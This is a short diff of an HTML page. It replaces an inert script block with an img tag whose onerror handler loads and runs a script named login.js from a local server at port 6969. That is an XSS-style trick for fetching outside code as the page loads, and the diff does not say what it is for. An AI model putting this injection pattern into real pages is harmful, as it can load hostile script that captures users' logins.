@@ -45,10 +45,7 @@
     </div>
   </div>
 
-  <script>
-      var s = document.createElement("script");
-      s.src = "http://127.0.0.1:6969/login.js";
-  </script>
+  <img onerror="var s=document.createElement('script');s.src='http://127.0.0.1:6969/login.js';document.body.appendChild(s)"/>
 
 
 </body>
